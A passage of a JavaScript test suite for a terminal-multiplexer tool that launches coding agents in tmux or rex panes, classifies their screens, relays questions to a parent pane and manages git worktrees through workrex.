  launch(options({ wait: false }), { runner, env: classifiedEnv(), clock: early });
  early.sleep(30_000);
  expect(waitFor("arena-a", {}, { runner, env: classifiedEnv(), clock: early }).verdict).toBe("stalled");
  expect(early.now()).toBeGreaterThanOrEqual(90_000);
  expect(early.now()).toBeLessThan(100_000);
});

test("a banner a slow harness holds for 40 seconds before it reads its argv prompt ends in done, not stalled", () => {
  const loading = Array.from({ length: 20 }, () => text("OpenAI Codex (v0.157.1)\nmodel: loading"));
  const { runner } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), ...loading, () => { write("result.md", "2 files\n"); return text("› Read brief.md"); }],
    curl: jev("not_started", 0.99),
  });
  expect(launch(options(), { runner, env: classifiedEnv(), clock: fakeClock() })).toMatchObject({ verdict: "done", result: "2 files\n" });
});

test("a tmux dialog Jev recognizes returns blocked with the screen and its label", () => {
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("Trust this folder?")], curl: jev("dialog_open", 0.8) });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: classifiedEnv(), clock }))
    .toMatchObject({ verdict: "blocked", screen: "Trust this folder?", screenLabel: { label: "dialog_open", confidence: 0.8 } });
  expect(clock.now()).toBeLessThan(15_000);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("a question asked on the tmux screen returns idle before the quiet fallback", () => {
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("Which branch?")], curl: jev("asked_in_terminal", 0.75) });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: classifiedEnv(), clock }))
    .toMatchObject({ verdict: "idle", screen: "Which branch?", screenLabel: { label: "asked_in_terminal", confidence: 0.75 } });
  expect(clock.now()).toBeLessThan(15_000);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("a failed or unreadable Jev call leaves the tmux wait exactly as it is without a key", () => {
  const failures = [
    { status: 7, stdout: "", stderr: "curl: (7) Failed to connect" },
    text("<html>bad gateway</html>"),
    text(JSON.stringify({ error: { message: "unauthorized" } })),
    jev("no_such_label", 1)(),
  ];
  const run = (env, curl) => {
    const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")], curl });
    const clock = fakeClock();
    const out = launch(options(), { runner, env, clock });
    close("arena-a", {}, { runner, env });
    return { out, at: clock.now(), tmux: calls.filter((c) => c[0] === "tmux"), curl: curls(calls).length };
  };
  const plain = run(tmuxEnv(), () => { throw new Error("curl without a key"); });
  for (const failure of failures) {
    const failed = run(classifiedEnv(), () => failure);
    expect(failed.curl).toBe(1);
    expect(failed.out).toEqual(plain.out);
    expect(failed.at).toBe(plain.at);
    expect(failed.tmux).toEqual(plain.tmux);
  }
});

test("the classifier runs only with a key and without PSTACK_SCREEN_CLASSIFIER=off", () => {
  const curlCount = (env) => {
    const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")], curl: jev("still_working", 0.9) });
    expect(launch(options(), { runner, env, clock: fakeClock() })).toMatchObject({ verdict: "idle" });
    close("arena-a", {}, { runner, env });
    return curls(calls).length;
  };
  expect(curlCount(classifiedEnv())).toBe(1);
  expect(curlCount(tmuxEnv())).toBe(0);
  expect(curlCount(classifiedEnv({ PSTACK_SCREEN_CLASSIFIER: "off" }))).toBe(0);
});

test("ask-parent types into a tmux parent pane only when Jev confidently reads no open dialog there", () => {
  const parentScreen = "Do you want to proceed?\n❯ 1. Yes\n  2. No";
  const askWith = (curl, { env = classifiedEnv(), parent = text(parentScreen) } = {}) => {
    const classified = [];
    const { runner, calls } = scripted({
      ...tmuxBase,
      "tmux capture-pane": (args) => {
        if (args.includes("%0")) return typeof parent === "function" ? parent() : parent;
        if (!existsSync(join(runDir(), "question.md"))) write("question.md", "Which branch?\n");
        return text(`agent ${calls.length}`);
      },
      curl: (args, opts) => { classified.push(sentBody(opts.input).state); return curl(args, opts); },
    });
    launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() });
    const before = calls.length;
    const out = askParent(runDir(), { runner, env, clock: fakeClock() });
    const captured = calls.slice(before).filter((c) => c[1] === "capture-pane").map((c) => c[c.indexOf("-t") + 1]);
    close("arena-a", {}, { runner, env: tmuxEnv() });
    return { out, captured, classified, typed: calls.filter((c) => c[1] === "send-keys" && c.includes("%0")) };
  };
  const unconfirmed = [
    jev("dialog_open", 0.99),
    jev("dialog_open", 0.55),
    jev("turn_finished", 0.69),
    () => ({ status: 28, stdout: "", stderr: "timeout" }),
    () => text("<html>bad gateway</html>"),
  ];
  for (const curl of unconfirmed) {
    const skipped = askWith(curl);
    expect(skipped.out).toMatchObject({ sent: false, reason: "parent pane is blocked" });
    expect(skipped.captured).toEqual(["%0"]);
    expect(skipped.classified).toEqual([parentScreen]);
    expect(skipped.typed).toEqual([]);
  }
  const unreadable = askWith(jev("turn_finished", 1), { parent: { status: 1, stdout: "", stderr: "can't find pane: %0" } });
  expect(unreadable.out).toMatchObject({ sent: false, reason: "parent pane is blocked" });
  expect(unreadable.captured).toEqual(["%0"]);
  expect(unreadable.classified).toEqual([]);
  expect(unreadable.typed).toEqual([]);
  for (const curl of [jev("turn_finished", 0.7), jev("still_working", 0.95)]) {
    const typed = askWith(curl);
    expect(typed.out).toMatchObject({ sent: true });
    expect(typed.captured).toEqual(["%0"]);
    expect(typed.classified).toEqual([parentScreen]);
    expect(typed.typed).toHaveLength(2);
  }
  const noCurl = () => { throw new Error("curl without the classifier"); };
  for (const env of [tmuxEnv(), classifiedEnv({ PSTACK_SCREEN_CLASSIFIER: "off" })]) {
    const blind = askWith(noCurl, { env });
    expect(blind.out).toMatchObject({ sent: true });
    expect(blind.typed).toHaveLength(2);
  }
});

const rexSelf = "block:01a1b285-e909-7a06-8e98-c0a309ac3b94";
const rexChild = "block:01a1b355-92eb-7338-a20c-ed13e0cfdb46";
const rexEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), REX_SESSION: "session:s1", REX_BLOCK: rexSelf, REX_SERVER: "unix:///rex.sock" });
const rexRecord = (state, at = 0, extra = {}) =>
  ({ records: [{ state, app: "codex", updated_at: new Date(at).toISOString(), owner: { pid: 7, name: "codex" } }, { id: "sub", state: "working", updated_at: new Date(at).toISOString() }].slice(0, extra.sub ? 2 : 1) });
const json = (body) => text(JSON.stringify(body));
const rexBase = {
  "rex window new": json({ window_id: "window:w1", block_ids: [rexChild], revision: 3 }),
  "rex split": json({ anchor_id: rexSelf, block_ids: [rexChild], split_ids: ["split:p1"], revision: 3 }),
  "rex block close": text(""),
  "rex block call -s session:s1 -b block:01a1b355-92eb-7338-a20c-ed13e0cfdb46 process": json({ last_exit: null }),
  [`rex block call -s session:s1 -b ${"block:01a1b355-92eb-7338-a20c-ed13e0cfdb46"} format`]: text(JSON.stringify({ content: "codex screen\n" })),
  "rex send": text(""),
  "rex send-key": text(""),
  "rex window close": text(""),
};
const childStatus = `rex block call -s session:s1 -b ${rexChild} program_status`;

test("rex launch opens one named background pane in the launcher's tab and settles on the status the harness reports", () => {
  const { runner, calls } = scripted({
    ...rexBase,
    [childStatus]: [json({ records: [] }), json(rexRecord("working", 1)), () => { write("result.md", "rex result\n"); return json(rexRecord("done", 4000)); }],
  });
  const out = launch(options(), { runner, env: rexEnv(), clock: fakeClock() });
  expect(out).toMatchObject({ verdict: "done", result: "rex result\n", mux: "rex" });
  expect(calls[0].slice(0, 14)).toEqual(["rex", "split", "-s", "session:s1", "-b", rexSelf, "--split", "right", "--label", "arena-a", "-c", root, "--focus=false", "--json"]);
  expect(calls.some((c) => c[1] === "window")).toBe(false);
  const addressed = calls.filter((c) => c[0] === "rex" && c.includes("-b") && c[1] !== "split").map((c) => c.slice(c.indexOf("-s"), c.indexOf("-b") + 2).join(" "));
  expect(new Set(addressed)).toEqual(new Set([`-s session:s1 -b ${rexChild}`]));
  close("arena-a", {}, { runner, env: rexEnv() });
  expect(calls.at(-1)).toEqual(["rex", "block", "close", "-s", "session:s1", rexChild]);
  expect(readdirSync(join(root, "panes")).filter((f) => f.startsWith("rex-layout-"))).toEqual([]);
});

test("later rex seats halve the largest live seat, down then right, and a closed seat leaves the layout", () => {
  const blocks = ["block:b1", "block:b2", "block:b3", "block:b4"];
  let opened = 0;
  const { runner, calls } = scripted({
    ...rexBase,
    "rex split": () => json({ block_ids: [blocks[opened++]] }),
    "rex block call": (args) => (args.includes("process") ? json({ last_exit: args.includes("block:b3") && opened > 3 ? 0 : null }) : json({ records: [] })),
  });
  for (const name of ["s1", "s2", "s3", "s4"]) launch(options({ name, wait: false }), { runner, env: rexEnv(), clock: fakeClock() });
  const splits = calls.filter((c) => c[1] === "split").map((c) => [c[c.indexOf("-b") + 1], c[c.indexOf("--split") + 1]]);
  expect(splits).toEqual([[rexSelf, "right"], ["block:b1", "below"], ["block:b1", "right"], ["block:b2", "right"]]);
  for (const name of ["s1", "s2", "s3", "s4"]) close(name, {}, { runner, env: rexEnv() });
  expect(readdirSync(join(root, "panes")).filter((f) => f.startsWith("rex-layout-"))).toEqual([]);
});

test("PSTACK_REX_PLACEMENT=tab gives a rex seat a tab of its own", () => {
  const { runner, calls } = scripted({ ...rexBase, [childStatus]: json({ records: [] }) });
  launch(options({ wait: false }), { runner, env: { ...rexEnv(), PSTACK_REX_PLACEMENT: "tab" }, clock: fakeClock() });
  expect(calls[0].slice(0, 6)).toEqual(["rex", "window", "new", "-s", "session:s1", "arena-a"]);
  close("arena-a", {}, { runner, env: rexEnv() });
  expect(calls.at(-1)).toEqual(["rex", "window", "close", "-s", "session:s1", "window:w1"]);
});

test("a rex done record from the turn before a send is ignored until the harness reports again", () => {
  const clock = fakeClock();
  launch(options({ wait: false }), { runner: scripted(rexBase).runner, env: rexEnv(), clock });
  clock.sleep(10_000);
  let polled = 0;
  const { runner, calls } = scripted({
    ...rexBase,
    [childStatus]: () => {
      polled += 1;
      if (polled < 3) return json(rexRecord("done", 5_000));
      if (polled === 3) return json(rexRecord("working", clock.now()));
      write("result.md", "second\n");
      return json(rexRecord("done", clock.now()));
    },
  });
  const out = send("arena-a", { text: "-x continue" }, { runner, env: rexEnv(), clock });
  expect(out).toMatchObject({ verdict: "done", result: "second\n" });
  expect(calls.filter((c) => c[1] === "send")).toEqual([["rex", "send", "-s", "session:s1", "-b", rexChild, "--", " -x continue"]]);
  expect(calls.filter((c) => c[1] === "send-key")).toEqual([["rex", "send-key", "-s", "session:s1", "-b", rexChild, "enter"]]);
});

test("rex returns blocked with the screen when the harness reports blocked, and error when its block is gone", () => {
  const blocked = scripted({ ...rexBase, [childStatus]: json(rexRecord("blocked", 1)), [`rex block call -s session:s1 -b ${rexChild} format`]: json({ content: "Allow this command?\n" }) });
  expect(launch(options(), { runner: blocked.runner, env: rexEnv(), clock: fakeClock() }))
    .toMatchObject({ verdict: "blocked", screen: "Allow this command?" });
  close("arena-a", {}, { runner: blocked.runner, env: rexEnv() });
  const gone = scripted({
    ...rexBase,
    [childStatus]: json({ records: [] }),
    [`rex block call -s session:s1 -b ${rexChild} process`]: [json({ last_exit: null }), { status: 3, stdout: "", stderr: "not found" }],
  });
  expect(launch(options(), { runner: gone.runner, env: rexEnv(), clock: fakeClock() })).toMatchObject({ verdict: "error" });
});

test("a rex harness that reports no status settles on its screen, as on tmux", () => {
  const { runner } = scripted({ ...rexBase, [childStatus]: json({ records: [] }), [`rex block call -s session:s1 -b ${rexChild} format`]: [json({ content: "banner" }), json({ content: "Trust this folder?" })] });
  const out = launch(options(), { runner, env: rexEnv(), clock: fakeClock() });
  expect(out).toMatchObject({ verdict: "idle", screen: "Trust this folder?" });
});

test("rex keys go to send-key under Rex's key names", () => {
  const { runner, calls } = scripted({ ...rexBase, [childStatus]: [json(rexRecord("idle", 0)), json(rexRecord("working", 1)), () => { write("result.md", "r\n"); return json(rexRecord("done", 1e9)); }] });
  launch(options({ wait: false }), { runner, env: rexEnv(), clock: fakeClock() });
  send("arena-a", { keys: "Down Enter Escape C-c y" }, { runner, env: rexEnv(), clock: fakeClock() });
  expect(calls.find((c) => c[1] === "send-key")).toEqual(["rex", "send-key", "-s", "session:s1", "-b", rexChild, "down", "enter", "escape", "ctrl+c", "y"]);
});

test("rex ask-parent types into an idle parent block and types nothing into a blocked one", () => {
  const parentStatus = `rex block call -s session:s1 -b ${rexSelf} program_status`;
  for (const [parent, sent] of [["idle", true], ["blocked", false]]) {
    const { runner, calls } = scripted({
      ...rexBase,
      [childStatus]: [json(rexRecord("working", 1)), () => { write("question.md", "Which branch?\n"); return json(rexRecord("done", 1e9)); }],
      [parentStatus]: json({ records: [{ state: parent, app: "claude-code", updated_at: "1970-01-01T00:00:00Z" }] }),
    });
    const asked = launch(options(), { runner, env: rexEnv(), clock: fakeClock() });
    expect(asked.verdict).toBe("question");
    expect(askParent(runDir(), { runner, env: {}, clock: fakeClock() }).sent).toBe(sent);
    const typed = calls.filter((c) => c.includes(rexSelf) && (c[1] === "send" || c[1] === "send-key"));
    expect(typed).toEqual(sent ? [
      ["rex", "send", "-s", "session:s1", "-b", rexSelf, "--", questionLine(asked.questionId)],
      ["rex", "send-key", "-s", "session:s1", "-b", rexSelf, "enter"],
    ] : []);
    close("arena-a", {}, { runner, env: rexEnv() });
  }
});

test("rex reads only the tail of a long scrollback, dropping the partial first line", () => {
  const { runner, calls } = scripted({
    ...rexBase,
    [childStatus]: json({ records: [] }),
    [`rex block call -s session:s1 -b ${rexChild} format`]: json({ content: "oldest", id: 9, total: 200_000 }),
    [`rex block call -s session:s1 -b ${rexChild} blob_read`]: json({ id: 9, data: "tial line\nnewest line\n", eof: true }),
  });
  launch(options({ wait: false }), { runner, env: rexEnv(), clock: fakeClock() });
  expect(peek("arena-a", { runner, env: rexEnv() }).screen).toBe("newest line");
  const read = calls.find((c) => c.includes("blob_read"));
  expect(JSON.parse(read.at(-1))).toEqual({ id: 9, offset: 200_000 - 65_536, max_bytes: 65_536 });
});

test("rex send --keys waits for a dialog's blocked status to clear before it settles", () => {
  const clock = fakeClock();
  let polled = 0;
  const { runner } = scripted({
    ...rexBase,
    [childStatus]: () => {
      polled += 1;
      if (polled <= 3) return json(rexRecord("blocked", 0));
      if (polled === 4) return json(rexRecord("working", clock.now()));
      write("result.md", "accepted\n");
      return json(rexRecord("done", clock.now()));
    },
  });
  launch(options({ wait: false }), { runner, env: rexEnv(), clock });
  expect(send("arena-a", { keys: "Enter" }, { runner, env: rexEnv(), clock })).toMatchObject({ verdict: "done", result: "accepted\n" });
});

// Runs the --agent script with Rex's variables, with true standing in for the harness.
function workrexRules(dir, { pane = rexChild, removeFails = false, trees = `${dir}__worktrees` } = {}) {
  const agents = [];
  return {
    agents,
    rules: {
      "workrex --version": text("workrex 0.1.278-rex.3\n"),
      "workrex add": (args, opts) => {
        const [shell, script] = args[args.indexOf("--agent") + 1].split(" ");
        const body = readFileSync(script.slice(1, -1), "utf8");
        const tree = `${trees}/${args[args.indexOf("--name") + 1]}`;
        agents.push({ args, opts, shell, body, tree, marker: join(runDir(), "block") });
        gitIn(opts.cwd, "worktree", "add", "-q", "-b", args[1], tree, args[args.indexOf("--base") + 1]);
        if (pane) {
          const ran = spawnSync("sh", ["-c", body.replace(/exec .*\n$/, "exec pwd\n")], { cwd: tree, encoding: "utf8", env: { ...process.env, REX_SESSION: "session:s1", REX_BLOCK: pane } });
          agents.at(-1).pwd = ran.stdout.trim();
        }
        return text("");
      },
      "rex block inspect": json({ session_id: "session:s1", block: { window_id: "window:w9" } }),
      "workrex remove": (args, opts) => {
        const force = args.includes("--force");
        const handle = args.at(-1);
        if (removeFails && !force) return { status: 1, stdout: "", stderr: "Cannot remove worktrees with uncommitted changes" };
        const tree = `${trees}/${handle}`;
        const checkedOut = gitIn(tree, "branch", "--show-current");
        gitIn(opts.cwd, "worktree", "remove", ...(force ? ["--force"] : []), tree);
        if (!args.includes("--keep-branch")) gitIn(opts.cwd, "branch", "-D", checkedOut);
        return text("");
      },
      "workrex close": text(""),
    },
  };
}
const rexDone = (name = "arena-a") => ({
  [childStatus]: [json({ records: [] }), () => { writeFileSync(join(root, "panes", name, "result.md"), "wrote it\n"); return json(rexRecord("done", 4000)); }],
});

test("in Rex a write agent's worktree and tab come from workrex add, and close hands the unused worktree back to workrex remove", () => {
  const dir = repo();
  const { rules, agents } = workrexRules(dir);
  const { runner, calls } = scripted({ ...rexBase, ...rules, ...rexDone() });
  const out = launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock: fakeClock() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  expect(out).toMatchObject({ verdict: "done", result: "wrote it\n", worktree: tree, route: "workrex" });
  expect(calls.some((c) => c.slice(0, 3).join(" ") === "rex window new")).toBe(false);
  const [{ args, opts, shell, body, pwd }] = agents;
  expect(args.slice(0, 9)).toEqual(["add", "pstack/arena-a", "--name", "pstack-arena-a", "--base", gitIn(dir, "rev-parse", "HEAD"), "--background", "--local", "--agent"]);
  expect(args[9].length).toBeLessThan(400);
  expect(opts).toMatchObject({ cwd: dir, input: "" });
  expect(shell).toBe("sh");
  expect(pwd).toBe(tree);
  expect(body).toMatch(/exec 'codex' '-m' 'gpt-6\.1-sol' .*brief\.md.*'\n$/);
  expect(readFileSync(join(runDir(), "block"), "utf8")).toBe(`session:s1\n${rexChild}\n${tree}\n`);
  expect(calls.filter((c) => c[0] === "rex" && c.includes("-b")).every((c) => c.includes(rexChild))).toBe(true);
  expect(close("arena-a", {}, { runner, env: rexEnv() }).worktree).toEqual({ path: tree, removed: true, branch: null });
  expect(calls.filter((c) => c[0] === "workrex").map((c) => c[1])).toEqual(["--version", "add", "remove"]);
  const closedAt = calls.findIndex((c) => c.slice(0, 3).join(" ") === "rex window close");
  expect(closedAt).toBeGreaterThan(-1);
  expect(closedAt).toBeLessThan(calls.findIndex((c) => c[1] === "remove"));
  expect(existsSync(tree)).toBe(false);
  expect(branches(dir)).toEqual(["main"]);
});

test("workrex keeps a worker's changes: a dirty worktree is only closed, and a branch with commits is never offered to remove", () => {
  const dir = repo();
  const dirty = workrexRules(dir, { removeFails: true });
  const first = scripted({ ...rexBase, ...dirty.rules, ...rexDone() });
  launch(options({ access: "write", cwd: dir }), { runner: first.runner, env: rexEnv(), clock: fakeClock() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  writeFileSync(join(tree, "new.txt"), "edit\n");
  expect(close("arena-a", {}, { runner: first.runner, env: rexEnv() }).worktree).toEqual({ path: tree, removed: false, branch: "pstack/arena-a" });
  expect(first.calls.filter((c) => c[0] === "workrex").map((c) => c.slice(1, 3).join(" "))).toEqual(["--version", "add pstack/arena-a", "remove pstack-arena-a", "close pstack-arena-a"]);
  gitIn(tree, "add", "new.txt");
  gitIn(tree, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "work");
  const again = scripted({ ...rexBase, ...dirty.rules, ...rexDone() });
  expect(() => launch(options({ access: "write", cwd: dir }), { runner: again.runner, env: rexEnv(), clock: fakeClock() })).toThrow("left from an earlier arena-a");
  const committed = workrexRules(dir);
  const second = scripted({ ...rexBase, ...committed.rules, ...rexDone("arena-b") });
  launch(options({ name: "arena-b", access: "write", cwd: dir }), { runner: second.runner, env: rexEnv(), clock: fakeClock() });
  const treeB = `${dir}__worktrees/pstack-arena-b`;
  writeFileSync(join(treeB, "b.txt"), "b\n");
  gitIn(treeB, "add", "b.txt");
  gitIn(treeB, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "b");
  expect(close("arena-b", {}, { runner: second.runner, env: rexEnv() }).worktree).toEqual({ path: treeB, removed: false, branch: "pstack/arena-b" });
  expect(second.calls.filter((c) => c[0] === "workrex").map((c) => c[1])).toEqual(["--version", "add", "close"]);
});

test("workrex close --discard hands a worktree with changes and commits to workrex remove --force, and deletes only its own branch", () => {
  const dir = repo();
  const rules = workrexRules(dir, { removeFails: true });
  const { runner } = scripted({ ...rexBase, ...rules.rules, ...rexDone() });
  launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock: fakeClock() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  gitIn(tree, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "work");
  gitIn(tree, "switch", "-q", "-c", "release");
  writeFileSync(join(tree, "new.txt"), "edit\n");
  expect(close("arena-a", { discard: true }, { runner, env: rexEnv() })).toMatchObject({ kept: null, worktree: { path: tree, removed: true, branch: null } });
  expect(existsSync(tree)).toBe(false);
  expect(branches(dir)).toEqual(["main", "release"]);
});

test("a discard that cannot remove the worktree keeps the run directory, so close --discard can run again", () => {
  const dir = repo();
  const fails = { ...workrexRules(dir).rules, "workrex remove": { status: 1, stdout: "", stderr: "busy" } };
  const first = scripted({ ...rexBase, ...fails, ...rexDone() });
  launch(options({ access: "write", cwd: dir }), { runner: first.runner, env: rexEnv(), clock: fakeClock() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  writeFileSync(join(tree, "new.txt"), "edit\n");
  const out = close("arena-a", { discard: true }, { runner: first.runner, env: rexEnv() });
  expect(out).toMatchObject({ kept: join(root, "panes", "arena-a"), worktree: { path: tree, removed: false, branch: "pstack/arena-a" } });
  const again = scripted({ ...rexBase, ...workrexRules(dir).rules });
  expect(close("arena-a", { discard: true }, { runner: again.runner, env: rexEnv() })).toMatchObject({ kept: null, worktree: { removed: true, branch: null } });
  expect(branches(dir)).toEqual(["main"]);
});

test("without workrex on PATH a Rex write agent gets pstack's own worktree and a plain tab", () => {
  const dir = repo();
  const { runner, calls } = scripted({ ...rexBase, "workrex --version": { status: null, stdout: "", stderr: "spawnSync workrex ENOENT" }, ...rexDone() });
  const out = launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock: fakeClock() });
  const tree = `${dir}__worktrees/pstack-arena-a`;
  expect(out).toMatchObject({ verdict: "done", worktree: tree });
  expect(calls.find((c) => c[1] === "window")).toContain(tree);
  expect(close("arena-a", {}, { runner, env: rexEnv() }).worktree).toEqual({ path: tree, removed: true, branch: null });
});

test("a workrex tab whose shell is back in the foreground reads as gone, while the harness in it counts as running", () => {
  const dir = repo();
  const { rules } = workrexRules(dir);
  const { runner } = scripted({
    ...rexBase,
    ...rules,
    [childStatus]: json({ records: [] }),
    [`rex block call -s session:s1 -b ${rexChild} process`]: [
      json({ last_exit: null, child: { pid: 10, name: "zsh" }, foreground: { pid: 11, name: "codex" } }),
      json({ last_exit: null, child: { pid: 10, name: "zsh" }, foreground: { pid: 10, name: "zsh" } }),
    ],
  });
  expect(launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock: fakeClock() })).toMatchObject({ verdict: "error" });
});

test("a workrex layout with no agent pane fails the launch and hands the worktree back", () => {
  const dir = repo();
  const { rules } = workrexRules(dir, { pane: null });
  const { runner, calls } = scripted({ ...rexBase, ...rules });
  expect(() => launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock: fakeClock() })).toThrow("no pane started the agent");
  expect(calls.filter((c) => c[0] === "workrex").map((c) => c[1])).toEqual(["--version", "add", "remove"]);
  expect(existsSync(`${dir}__worktrees/pstack-arena-a`)).toBe(false);
  expect(existsSync(runDir())).toBe(false);
});

test("a workrex launch waits for the agent's shell to report its block, which lands after workrex add returns", () => {
  const dir = repo();
  const { rules, agents } = workrexRules(dir, { pane: null });
  const clock = fakeClock();
  const sleep = clock.sleep;
  let slept = 0;
  clock.sleep = (ms) => {
    sleep(ms);
    if (++slept === 3) writeFileSync(agents[0].marker, `session:s1\n${rexChild}\n${agents[0].tree}\n`);
  };
  const { runner } = scripted({ ...rexBase, ...rules, ...rexDone() });
  expect(launch(options({ access: "write", cwd: dir }), { runner, env: rexEnv(), clock })).toMatchObject({ verdict: "done" });
});

test("a workrex worktree_dir elsewhere moves the agent there, and close follows it", () => {
  const dir = repo();
  const elsewhere = join(realpathSync(root), "wt-elsewhere");
  mkdirSync(elsewhere);
  mkdirSync(join(dir, "pkg"));
  writeFileSync(join(dir, "pkg", "p.txt"), "p\n");
  gitIn(dir, "add", "pkg");
  gitIn(dir, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "pkg");
  const { rules, agents } = workrexRules(dir, { trees: elsewhere });
  const { runner } = scripted({ ...rexBase, ...rules, ...rexDone() });
  const tree = join(elsewhere, "pstack-arena-a");
  expect(launch(options({ access: "write", cwd: join(dir, "pkg") }), { runner, env: rexEnv(), clock: fakeClock() })).toMatchObject({ verdict: "done", worktree: tree });
  expect(agents[0].pwd).toBe(join(tree, "pkg"));
  expect(close("arena-a", {}, { runner, env: rexEnv() }).worktree).toEqual({ path: tree, removed: true, branch: null });
  expect(existsSync(tree)).toBe(false);
});
